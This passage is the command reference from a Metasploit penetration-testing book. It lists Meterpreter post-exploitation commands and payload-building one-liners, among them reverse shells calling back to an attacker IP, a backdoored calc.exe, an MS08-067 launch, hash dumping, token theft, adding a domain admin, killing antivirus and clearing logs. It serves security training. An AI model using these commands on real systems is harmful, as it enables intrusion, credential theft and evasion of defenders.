style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">drop_token</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Stop impersonating the current token.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">getsystem</p><p style="padding-left: 108pt;text-indent: 0pt;text-align: left;">Attempt to elevate permissions to SYSTEM-level access through multiple attack vectors.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">shell</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Drop into an interactive shell with all available tokens.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">execute -f cmd.exe -i</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Execute <span class="s19">cmd.exe </span>and interact with it.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">execute -f cmd.exe -i -t</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Execute <span class="s19">cmd.exe </span>with all available tokens.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">execute -f cmd.exe -i -H -t</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Execute <span class="s19">cmd.exe </span>with all available tokens and make it a hidden process.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">rev2self</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Revert back to the original user you used to compromise the target.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">reg <i>command</i></p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Interact, create, delete, query, set, and much more in the target’s registry.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">setdesktop <i>number</i></p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Switch to a different screen based on who is logged in.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">screenshot</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Take a screenshot of the target’s screen.</p><p class="s24" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">upload <i>file</i></p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Upload a file to the target.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">download <i>file</i></p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Download a file from the target.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">keyscan_start</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Start sniffing keystrokes on the remote target.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">keyscan_dump</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Dump the remote keys captured on the target.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">keyscan_stop</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Stop sniffing keystrokes on the remote target.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">getprivs</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Get as many privileges as possible on the target.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">uictl enable keyboard/mouse</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Take control of the keyboard and/or mouse.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">background</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Run your current Meterpreter shell in the background.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">hashdump</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Dump all hashes on the target.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">use sniffer</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Load the sniffer module.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">sniffer_interfaces</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">List the available interfaces on the target.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">sniffer_dump <i>interfaceID pcapname</i></p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Start sniffing on the remote target.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">sniffer_start <i>interfaceID packet-buffer</i></p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Start sniffing with a specific range for a packet buffer.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">sniffer_stats <i>interfaceID</i></p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Grab statistical information from the interface you are sniffing.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">sniffer_stop <i>interfaceID</i></p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Stop the sniffer.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">add_user <i>username password </i>-h <i>ip</i></p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Add a user on the remote target.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">add_group_user &quot;Domain Admins&quot; <i>username </i>-h <i>ip</i></p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Add a username to the <span class="s19">Domain Administrators </span>group on the remote target.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">clearev</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Clear the event log on the target machine.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">timestomp</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Change file attributes, such as creation date (antiforensics measure).</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">reboot</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Reboot the target machine.</p><p class="s4" style="padding-top: 5pt;padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark495">MSFpayload Commands</a><a name="bookmark505">&zwnj;</a></p><p class="s24" style="padding-top: 10pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">msfpayload -h</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">List available payloads.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">msfpayload windows/meterpreter/bind_tcp O</p><p style="padding-left: 108pt;text-indent: 0pt;text-align: left;">List available options for the <span class="s25">windows/meterpreter/bind_tcp </span>payload (all of these can use any payload).</p><p class="s24" style="padding-top: 6pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 X &gt; payload.exe</p><p style="padding-left: 108pt;text-indent: 0pt;text-align: left;">Create a Meterpreter <span class="s19">reverse_tcp </span>payload to connect back to 192.168.1.5 and on port 443, and then save it as a Windows Portable Executable named <span class="s19">payload.exe</span>.</p><p class="s24" style="padding-top: 5pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 R &gt; payload.raw</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Same as above, but export as raw format. This will be used later in</p><p class="s19" style="padding-left: 108pt;text-indent: 0pt;text-align: left;">msfencode<span class="p">.</span></p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">msfpayload windows/meterpreter/bind_tcp LPORT=443 C &gt; payload.c</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Same as above but export as C-formatted shellcode.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">msfpayload  windows/meterpreter/bind_tcp  LPORT=443  J  &gt;  payload.java</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Export as <span class="s19">%u encoded </span>JavaScript.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark496">MSFencode Commands</a><a name="bookmark506">&zwnj;</a></p><p class="s24" style="padding-top: 10pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">msfencode -h</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Display the <span class="s19">msfencode </span>help.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">msfencode -l</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">List the available encoders.</p><p class="s24" style="padding-top: 6pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">msfencode -t (c, elf, exe, java, js_le, js_be, perl, raw, ruby, vba, vbs, loop-vbs, asp, war, macho)</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Format to display the encoded buffer.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">msfencode -i payload.raw -o encoded_payload.exe -e x86/shikata_ga_nai -c 5</p><p class="s24" style="padding-left: 108pt;text-indent: 0pt;line-height: 10pt;text-align: left;">-t exe</p><p style="padding-left: 108pt;text-indent: 0pt;text-align: left;">Encode <span class="s25">payload.raw </span>with <span class="s25">shikata_ga_nai </span>five times and export it to an output file named <span class="s19">encoded_payload.exe</span>.</p><p class="s24" style="padding-top: 5pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">msfpayload windows/meterpreter/bind_tcp LPORT=443 R | msfencode -e x86/</p><p class="s24" style="padding-left: 108pt;text-indent: 0pt;text-align: left;">_countdown  -c  5  -t  raw  |  msfencode  -e  x86/shikata_ga_nai  -c  5  -t  exe  -o multi-encoded_payload.exe</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Create a multi-encoded payload.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">msfencode -i payload.raw BufferRegister=ESI -e x86/alpha_mixed -t c</p><p style="padding-left: 108pt;text-indent: 0pt;text-align: left;">Create pure alphanumeric shellcode where ESI points to the shellcode; output in C-style notation.</p><p class="s4" style="padding-top: 5pt;padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark497">MSFcli Commands</a><a name="bookmark507">&zwnj;</a></p><p class="s24" style="padding-top: 9pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">msfcli | grep exploit</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Show only exploits.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">msfcli | grep exploit/windows</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Show only Windows exploits.</p><p class="s24" style="padding-top: 6pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">msfcli  exploit/windows/smb/ms08_067_netapi  PAYLOAD=windows/meterpreter/bind_tcp LPORT=443  RHOST=172.16.32.142  E</p><p style="padding-left: 108pt;text-indent: 0pt;text-align: left;">Launch <span class="s25">ms08_067_netapi </span>exploit at 172.16.32.142 with a <span class="s25">bind_tcp </span>payload being delivered to listen on port 443.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark498">MSF, Ninja, Fu</a><a name="bookmark508">&zwnj;</a></p><p style="padding-top: 9pt;padding-left: 108pt;text-indent: -18pt;text-align: left;"><span class="s24">msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 R | msfencode -x calc.exe -k -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe </span>Create a reverse Meterpreter payload connecting back to 192.168.1.5 on port 443 using <span class="s19">calc.exe </span>as a template to backdoor. Keep execution flow within the application for it to continue to work, and output the <span class="s25">shikata_ga_nai </span>encoded payload to <span class="s19">payload.exe</span>.</p><p style="padding-top: 6pt;padding-left: 108pt;text-indent: -18pt;text-align: left;"><span class="s24">msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 R | msfencode -x calc.exe -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe </span>Create a reverse Meterpreter payload connecting back to 192.168.1.5 on port 443 using <span class="s19">calc.exe </span>as a template to backdoor. Does not keep execu- tion flow within the application and will not prompt anything back to the end user when it is executed. This is useful when you have remote access via a browser exploit and don’t want the calculator application popping up to the end user. Also outputs the <span class="s25">shikata_ga_nai </span>encoded payload to <span class="s19">payload.exe</span>.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">msfpayload windows/meterpreter/bind_tcp LPORT=443 R | msfencode -o payload.exe</p><p class="s24" style="padding-left: 108pt;text-indent: 0pt;text-align: left;">-e  x86/shikata_ga_nai  -c  7  -t  exe  &amp;&amp;  msfcli  multi/handler  PAYLOAD=windows/ meterpreter/bind_tcp  LPORT=443  E</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Create a <span class="s54">bind_tcp </span>Meterpreter payload in raw format, encode it seven</p><p style="padding-left: 108pt;text-indent: 0pt;text-align: left;">times using <span class="s25">shikata_ga_nai</span>, output it in Windows portable executable for- mat with a name of <span class="s19">payload.exe</span>, and then have a multi-handler listening for it to execute.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-top: 6pt;padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark499">MSFvenom</a><a name="bookmark509">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Leverage <span class="s19">msfvenom</span>, an all-in-one suite, to create and encode your payload:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_730.png"/></span></p><p class="s24" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">msfvenom --payload</p><p class="s25" style="padding-left: 107pt;text-indent: -17pt;line-height: 88%;text-align: left;">windows/meterpreter/reverse_tcp --format exe --encoder x86/shikata_ga_nai LHOST=172.16.1.32 LPORT=443 &gt; msf.exe</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] x86/shikata_ga_nai succeeded with size 317 (iteration=1) root@bt://opt/framework3/msf3#</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_731.png"/></span></p><p style="padding-top: 6pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">This one liner will create a payload and automatically generate it in an executable format.</p><p class="s4" style="padding-top: 5pt;padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark500">Meterpreter Post Exploitation Commands</a><a name="bookmark510">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Elevate your permissions on Windows-based systems using Meterpreter:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_732.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">meterpreter &gt; <span class="s24">use priv</span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">meterpreter &gt; <span class="s24">getsystem</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_733.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Steal a domain administrator token from a given process ID, add a domain account, and then add it to the <span class="s19">Domain Admins </span>group:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_734.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">meterpreter &gt; <span class="s24">ps</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">meterpreter &gt; <span class="s24">steal_token 1784</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">meterpreter &gt; <span class="s24">shell</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">C:\Windows\system32&gt;<span class="s24">net user metasploit p@55w0rd /ADD /DOMAIN</span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">C:\Windows\system32&gt;<span class="s24">net group &quot;Domain Admins&quot; metasploit /ADD /DOMAIN</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_735.png"/></span></p><p style="padding-top: 7pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">Dump password hashes from the SAM database:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_736.png"/></span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">meterpreter &gt; <span class="s24">use priv </span>meterpreter &gt; <span class="s24">getsystem </span>meterpreter &gt; <span class="s24">hashdump</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_737.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s22" style="padding-left: 42pt;text-indent: 0pt;text-align: center;">NOTE     <span class="s19">On Win2k8 you may need to migrate to a process that is running as SYSTEM if</span></p><p class="s35" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">getsystem <span class="s19">and </span>hashdump <span class="s19">throw exceptions.</span></p><p style="padding-top: 6pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">Automigrate to a separate process:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_738.png"/></span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">meterpreter &gt; <span class="s24">run migrate</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_739.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Kill antivirus processes running on the target via the <span class="s19">killav </span>Meterpreter script:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_740.png"/></span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">meterpreter &gt; <span class="s24">run killav</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_741.png"/></span></p><p style="padding-top: 7pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">Capture keystrokes on target machines from within a particular process:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_742.png"/></span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">meterpreter &gt; <span class="s24">ps </span>meterpreter &gt; <span class="s24">migrate 1436 </span>meterpreter &gt; <span class="s24">keyscan_start </span>meterpreter &gt; <span class="s24">keyscan_dump </span>meterpreter &gt; <span class="s24">keyscan_stop</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_743.png"/></span></p><p style="padding-top: 7pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">Use Incognito to impersonate an administrator:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_744.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">meterpreter &gt; <span class="s24">use incognito </span>meterpreter &gt; <span class="s24">list_tokens -u </span>meterpreter &gt; <span class="s24">use priv </span>meterpreter &gt; <span class="s24">getsystem</span></p><p class="s25" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">meterpreter &gt; <span class="s24">list_tokens -u</span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">meterpreter &gt; <span class="s24">impersonate_token IHAZSECURITY\\Administrator</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_745.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">See what protection mechanisms are in place on the compromised target, display the help menu, disable Windows Firewall, and kill all counter- measures found:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_746.png"/></span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">meterpreter &gt; <span class="s24">run getcountermeasure </span>meterpreter &gt; <span class="s24">run getcountermeasure -h </span>meterpreter &gt; <span class="s24">run getcountermeasure -d -k</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_747.png"/></span></p><p style="padding-top: 7pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">Identify whether the compromised system is a virtual machine:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_748.png"/></span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">meterpreter &gt; <span class="s24">run checkvm</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_749.png"/></span></p><p style="padding-top: 7pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">Drop into a command shell for a current Meterpreter console session:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_750.png"/></span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">meterpreter &gt; <span class="s24">shell</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_751.png"/></span></p><p style="padding-top: 7pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">Get a remote GUI (VNC) on the target machine:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_752.png"/></span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">meterpreter &gt; <span class="s24">run vnc</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_753.png"/></span></p><p style="padding-top: 7pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">Background a currently running Meterpreter console:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_754.png"/></span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">meterpreter &gt; <span class="s24">background</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_755.png"/></span></p><p style="padding-top: 7pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">Bypass Windows User Access Control:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_756.png"/></span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">meterpreter &gt; <span class="s24">run post/windows/escalate/bypassuac</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_757.png"/></span></p><p style="padding-top: 7pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">Dump Hashes on an OS X system:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_758.png"/></span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">meterpreter &gt; <span class="s24">run post/osx/gather/hashdump</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_759.png"/></span></p><p style="padding-top: 7pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">Dump Hashes on a Linux system:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_760.png"/></span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">meterpreter &gt; <span class="s24">run post/linux/gather/hashdump</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_761.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s11" style="padding-top: 7pt;padding-left: 83pt;text-indent: 0pt;text-align: center;"><a name="bookmark511">I N D E X </a><a name="bookmark512">&zwnj;</a></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s55" style="padding-left: 90pt;text-indent: 